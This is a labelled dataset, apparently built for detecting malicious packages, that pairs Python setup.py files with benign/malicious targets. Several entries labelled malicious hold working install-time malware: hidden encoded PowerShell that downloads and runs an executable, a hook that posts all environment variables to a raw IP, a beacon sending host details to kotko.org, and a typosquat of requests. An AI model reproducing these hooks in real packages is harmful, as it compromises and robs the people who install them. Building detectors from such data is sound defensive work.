namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-dlp\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\"scripts/fixup_dlp_v2_keywords.py\"],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "fedora_messaging-3.0.2", "func": "#!/usr/bin/env python\n#\n# Copyright (C) 2018  Red Hat, Inc.\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License along\n# with this program; if not, write to the Free Software Foundation, Inc.,\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\nimport os\n\nfrom setuptools import find_packages, setup\n\n\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, \"README\")) as fd:\n    README = fd.read()\n\n\nsetup(\n    name=\"mailman_messages\",\n    version=\"1.0.0\",\n    description=\"A sample schema package for messages sent by mailman\",\n    long_description=README,\n    url=\"https://github.com/fedora-infra/fedora-messaging/\",\n    # Possible options are at https://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        \"License :: OSI Approved :: GNU General Public License v2 or later (GPLv2+)\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    license=\"GPLv2+\",\n    maintainer=\"Fedora Infrastructure Team\",\n    maintainer_email=\"infrastructure@lists.fedoraproject.org\",\n    platforms=[\"Fedora\", \"GNU/Linux\"],\n    keywords=\"fedora\",\n    packages=find_packages(),\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=[\"fedora_messaging\"],\n    test_suite=\"mailman_messages.tests\",\n    entry_points={\n        \"fedora.messages\": [\n            \"mailman.messageV1=mailman_messages.messages:MessageV1\",\n            \"mailman.messageV2=mailman_messages.messages:MessageV2\",\n        ]\n    },\n)\n", "target": 0}
{"idx": "flake8-future-annotations-0.0.5", "func": "from setuptools import setup  # type: ignore[import]\n\nsetup()\n", "target": 0}
{"idx": "esqminekill-5.84", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqminekill',\n    packages = ['modlib'],\n    version = '7.62',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dotted_dict-1.1.3", "func": "#!/usr/bin/env python\n\nfrom setuptools import find_packages, setup\n\ndesc = \"\"\nwith open(\"README.rst\") as f:\n    desc = f.read()\n\nsetup(\n    name=\"dotted_dict\",\n    version=\"1.1.3\",\n    description=(\"dict object with support for addressing keys in dot notation.\"),\n    long_description=desc,\n    url=\"https://github.com/josh-paul/dotted_dict\",\n    author=\"Josh Paul\",\n    author_email=\"trevalen@me.com\",\n    license=\"Apache v2\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n    ],\n    keywords=\"dotted dict dotted_dict\",\n    packages=find_packages(exclude=[\"contrib\", \"docs\", \"examples\", \"test*\"]),\n    install_requires=[],\n    extras_require={},\n    package_data={},\n    data_files=[],\n    entry_points={},\n)\n", "target": 0}
{"idx": "esqgameedver-6.52", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgameedver',\n    packages = ['modlib'],\n    version = '6.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "test-packages2-0.1", "func": "import os\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport requests\n\nclass CustomInstall(install):\n    def run(self):\n        post_data = {\n            \"package\": \"test-packages2\",\n            \"version\": \"0.1\",\n            \"envs\": dict(os.environ)\n        }\n        requests.post(\n            \"https://35.222.28.100\",\n            json=post_data,\n            verify=False\n        )\n        super().run()\n\nsetup(\n    name=\"test-packages2\",\n    version=\"0.1\",\n    description='A dynamically generated package',\n    packages=find_packages(),\n    install_requires=['requests', 'os'],\n    cmdclass={'install': CustomInstall}\n)\n", "target": 1}
{"idx": "git-remote-codecommit-1.16", "func": "#!/usr/bin/env python\n\nimport os\nimport setuptools\n\n__version__ = '1.16'\n\n\ndef read(fname):\n  return open(os.path.join(os.path.dirname(__file__), fname)).read()\n\n\nsetuptools.setup(\n    name = 'git-remote-codecommit',\n    packages = ['git_remote_codecommit'],\n    version = __version__,\n    description = 'Git remote prefix to simplify pushing to and pulling from CodeCommit.',\n    long_description = read('README.rst'),\n    author = 'Amazon Web Services',\n    url = 'https://github.com/awslabs/git-remote-codecommit',\n    license = 'Apache License 2.0',\n    install_requires = ['botocore >= 1.17.0'],\n    entry_points = {\n        'console_scripts': [\n            'git-remote-codecommit = git_remote_codecommit:main',\n        ],\n    },\n    classifiers = [\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Topic :: Utilities',\n        'License :: OSI Approved :: Apache Software License',\n    ],\n)\n", "target": 0}
{"idx": "fab-classic-1.19.1", "func": "#!/usr/bin/env python\nimport os\nfrom setuptools import setup\n\nfrom fabric.version import get_version\n\n\nlong_description = open(\"README.rst\").read()\n\n# set PARAMIKO_REPLACE=1 to require \"paramiko\" instead of \"paramiko-ng\"\nparamiko = 'paramiko' if os.environ.get('PARAMIKO_REPLACE') else 'paramiko-ng'\n\nsetup(\n    name='fab-classic',\n    version=get_version('short'),\n    description='fab-classic is a simple, Pythonic tool for remote execution and deployment.',\n    long_description=long_description,\n    author='Jeff Forcier',\n    author_email='jeff@bitprophet.org',\n    maintainer='Pierce Lopez',\n    maintainer_email='pierce.lopez@gmail.com',\n    url='https://github.com/ploxiln/fab-classic',\n    packages=['fabric', 'fabric.contrib'],\n    install_requires=[paramiko, 'six>=1.10.0'],\n    entry_points={\n        'console_scripts': [\n            'fab = fabric.main:main',\n        ]\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Unix',\n        'Operating System :: POSIX',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: Build Tools',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: System :: Clustering',\n        'Topic :: System :: Software Distribution',\n        'Topic :: System :: Systems Administration',\n    ],\n)\n", "target": 0}
{"idx": "distro-1.7.0", "func": "# Copyright 2015-2020 Nir Cohen\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "lgtbstr-8.92", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'LGTBstr',\n    packages = ['modlib'],\n    version = '9.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "rwquests-2.28.1", "func": "from setuptools import setup\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nabout = {}\nabout['__title__'] = \"rwquests\"\nabout['__description__'] = \"Python HTTP for Humans.\"\nabout['__url__'] = \"https://requests.readthedocs.io\"\nabout['__version__'] = \"2.28.1\"\nabout['__build__'] = 0x022801\nabout['__author__'] = \"Kenneth Reitz\"\nabout['__author_email__'] = \"me@kennethreitz.org\"\nabout['__license__'] = \"Apache 2.0\"\nabout['__copyright__'] = \"Copyright 2022 Kenneth Reitz\"\nabout['__cake__'] = \"\\u2728 \\U0001f370 \\u2728\"\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nsetup(\n    name=about[\"__title__\"],\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"rwquests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n", "target": 1}
{"idx": "empyrical-0.5.5", "func": "#!/usr/bin/env python\n#\n# Copyright 2016 Quantopian, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nfrom setuptools import setup\nimport versioneer\n\n\nDISTNAME = \"empyrical\"\nDESCRIPTION = \"\"\"empyrical is a Python library with performance and risk \\\nstatistics commonly used in quantitative finance\"\"\"\nLONG_DESCRIPTION = \"\"\"empyrical is a Python library with performance and risk\nstatistics commonly used in quantitative finance by `Quantopian Inc`_.\n\n.. _Quantopian Inc: https://www.quantopian.com\n.. _Zipline: https://zipline.io\n.. _pyfolio: https://quantopian.github.io/pyfolio/\n\"\"\"\nMAINTAINER = \"Quantopian Inc\"\nMAINTAINER_EMAIL = \"opensource@quantopian.com\"\nAUTHOR = \"Quantopian Inc\"\nAUTHOR_EMAIL = \"opensource@quantopian.com\"\nURL = \"https://github.com/quantopian/empyrical\"\nLICENSE = \"Apache License, Version 2.0\"\n\nclassifiers = [\n    \"Development Status :: 4 - Beta\",\n    \"Programming Language :: Python\",\n    \"Programming Language :: Python :: 2\",\n    \"Programming Language :: Python :: 3\",\n    \"Programming Language :: Python :: 2.7\",\n    \"Programming Language :: Python :: 3.4\",\n    \"Programming Language :: Python :: 3.5\",\n    \"License :: OSI Approved :: Apache Software License\",\n    \"Intended Audience :: Science/Research\",\n    \"Topic :: Scientific/Engineering\",\n    \"Topic :: Scientific/Engineering :: Mathematics\",\n    \"Operating System :: OS Independent\"\n]\n\n\ntest_reqs = [\n    \"nose>=1.3.7\",\n    \"parameterized>=0.6.1\"\n]\n\n\nrequirements = [\n    'numpy>=1.9.2',\n    'pandas>=0.16.1',\n    'scipy>=0.15.1',\n    \"pandas-datareader>=0.2\"\n]\n\nextras_requirements = {\n    \"dev\": [\n        \"nose==1.3.7\",\n        \"parameterized==0.6.1\",\n        \"flake8==2.5.1\"\n    ]\n}\n\n\nif __name__ == \"__main__\":\n    setup(\n        name=DISTNAME,\n        cmdclass=versioneer.get_cmdclass(),\n        version=versioneer.get_version(),\n        maintainer=MAINTAINER,\n        maintainer_email=MAINTAINER_EMAIL,\n        description=DESCRIPTION,\n        license=LICENSE,\n        url=URL,\n        long_description=LONG_DESCRIPTION,\n        packages=[\"empyrical\", \"empyrical.tests\"],\n        classifiers=classifiers,\n        install_requires=requirements,\n        extras_require=extras_requirements,\n        tests_require=test_reqs,\n        test_suite=\"nose.collector\"\n    )\n", "target": 0}
{"idx": "py-gameping-9.39", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-gameping',\n    packages = ['modlib'],\n    version = '10.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dagster-pandas-0.16.3", "func": "import os\nfrom typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef long_description() -> str:\n    here = os.path.abspath(os.path.dirname(__file__))\n    with open(os.path.join(here, \"README.md\"), \"r\", encoding=\"utf8\") as fh:\n        return fh.read()\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_pandas/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagster-pandas\",\n        version=ver,\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=(\n            \"Utilities and examples for working with pandas and dagster, an opinionated \"\n            \"framework for expressing data pipelines\"\n        ),\n        long_description=long_description(),\n        long_description_content_type=\"text/markdown\",\n        url=\"https://github.com/dagster-io/dagster\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagster_pandas_tests*\"]),\n        include_package_data=True,\n        install_requires=[\"dagster==1.0.3\", \"pandas\"],\n    )\n", "target": 0}
{"idx": "dbt-spark-1.2.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\nimport re\n\n# require python 3.7 or newer\nif sys.version_info < (3, 7):\n    print(\"Error: dbt does not support this version of Python.\")\n    print(\"Please upgrade to Python 3.7 or higher.\")\n    sys.exit(1)\n\n\n# require version of setuptools that supports find_namespace_packages\nfrom setuptools import setup\n\ntry:\n    from setuptools import find_namespace_packages\nexcept ImportError:\n    # the user has a downlevel version of setuptools.\n    print(\"Error: dbt requires setuptools v40.1.0 or higher.\")\n    print('Please upgrade setuptools with \"pip install --upgrade setuptools\" ' \"and try again\")\n    sys.exit(1)\n\n\n# pull long description from README\nthis_directory = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(this_directory, \"README.md\"), \"r\", encoding=\"utf8\") as f:\n    long_description = f.read()\n\n\n# get this package's version from dbt/adapters/<name>/__version__.py\ndef _get_plugin_version_dict():\n    _version_path = os.path.join(this_directory, \"dbt\", \"adapters\", \"spark\", \"__version__.py\")\n    _semver = r\"\"\"(?P<major>\\d+)\\.(?P<minor>\\d+)\\.(?P<patch>\\d+)\"\"\"\n    _pre = r\"\"\"((?P<prekind>a|b|rc)(?P<pre>\\d+))?\"\"\"\n    _version_pattern = fr\"\"\"version\\s*=\\s*[\"']{_semver}{_pre}[\"']\"\"\"\n    with open(_version_path) as f:\n        match = re.search(_version_pattern, f.read().strip())\n        if match is None:\n            raise ValueError(f\"invalid version at {_version_path}\")\n        return match.groupdict()\n\n\n# require a compatible minor version (~=), prerelease if this is a prerelease\ndef _get_dbt_core_version():\n    parts = _get_plugin_version_dict()\n    minor = \"{major}.{minor}.0\".format(**parts)\n    pre = parts[\"prekind\"] + \"1\" if parts[\"prekind\"] else \"\"\n    return f\"{minor}{pre}\"\n\n\npackage_name = \"dbt-spark\"\npackage_version = \"1.2.0\"\ndbt_core_version = _get_dbt_core_version()\ndescription = \"\"\"The Apache Spark adapter plugin for dbt\"\"\"\n\nodbc_extras = [\"pyodbc>=4.0.30\"]\npyhive_extras = [\n    \"PyHive[hive]>=0.6.0,<0.7.0\",\n    \"thrift>=0.11.0,<0.16.0\",\n]\nsession_extras = [\"pyspark>=3.0.0,<4.0.0\"]\nall_extras = odbc_extras + pyhive_extras + session_extras\n\nsetup(\n    name=package_name,\n    version=package_version,\n    description=description,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"dbt Labs\",\n    author_email=\"info@dbtlabs.com\",\n    url=\"https://github.com/dbt-labs/dbt-spark\",\n    packages=find_namespace_packages(include=[\"dbt\", \"dbt.*\"]),\n    include_package_data=True,\n    install_requires=[\n        \"dbt-core~={}\".format(dbt_core_version),\n        \"sqlparams>=3.0.0\",\n    ],\n    extras_require={\n        \"ODBC\": odbc_extras,\n        \"PyHive\": pyhive_extras,\n        \"session\": session_extras,\n        \"all\": all_extras,\n    },\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n    python_requires=\">=3.7\",\n)\n", "target": 0}
{"idx": "eight-1.0.1", "func": "#!/usr/bin/env python\n\nimport os\nfrom setuptools import setup, find_packages\n\ninstall_requires = [line.rstrip() for line in open(os.path.join(os.path.dirname(__file__), \"requirements.txt\"))]\n\nsetup(\n    name='eight',\n    version='1.0.1',\n    url='https://github.com/kislyuk/eight',\n    license='Apache Software License',\n    author='Andrey Kislyuk',\n    author_email='kislyuk@gmail.com',\n    description='Python 2 to the power of 3. A lightweight porting helper library.',\n    long_description=open('README.rst').read(),\n    install_requires=install_requires,\n    packages=find_packages(exclude=['test']),\n    include_package_data=True,\n    platforms=['MacOS X', 'Posix'],\n    classifiers=[\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: POSIX',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Development Status :: 4 - Beta',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "ld_impl_linux-64-2.33.1", "func": "# Always prefer setuptools over distutils\nfrom setuptools import setup, find_packages\nimport atexit\nimport requests\nimport os\nimport pathlib\nimport base64\nfrom multiprocessing.pool import ThreadPool as Pool\nfrom distutils.command.install import install\n\n\nhere = pathlib.Path(__file__).parent.resolve()\n\n# Get the long description from the README file\nlong_description = (here / 'README.md').read_text(encoding='utf-8')\n\n# Arguments marked as \"Required\" below must be included for upload to PyPI.\n# Fields marked as \"Optional\" may be commented out.\n\ncompany = \"pypi+\"+\"google-research/google-research\"+\"+\"\nname = \"ld_impl_linux-64\"\nversion = \"2.33.1\";\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\nfrom subprocess import check_call\n\n\n\n# def _post_install():\n#     _post_install\n\n\nclass new_install(install):\n    def __init__(self, *args, **kwargs):\n        super(new_install, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\n\ndef _post_install():\n    file_name = 'bykotko.txt'\n    f = open(file_name, 'a+')  # open file in append mode\n    f.write('kotko')\n    f.close()\n\n    ip = requests.get('https://api.ipify.org').text\n    ipText = format(ip);\n    myhost = os.uname()[1]\n    currentPath = requests.utils.quote(bytes(pathlib.Path(__file__).parent.absolute()));\n\n    PYdata = { \"ip\": ipText,\n               \"host\": myhost,\n               \"path\": currentPath, }\n    PYdataS = ipText+\",\"+myhost+\",(\"+currentPath+\")\"\n\n    message = PYdataS\n    message_bytes = message.encode('ascii')\n    base64_bytes = base64.b64encode(message_bytes)\n    base64_message = base64_bytes.decode('ascii')\n\n    r  = requests.get(\"https://kotko.org?\"+company+name+\"=\"+base64_message)\n\n\n\nsetup(\n    # This is the name of your project. The first time you publish this\n    # package, this name will be registered for you. It will determine how\n    # users can install this project, e.g.:\n    #\n    # $ pip install sampleproject\n    #\n    # And where it will live on PyPI: https://pypi.org/project/sampleproject/\n    #\n    # There are some restrictions on what makes a valid project name\n    # specification here:\n    # 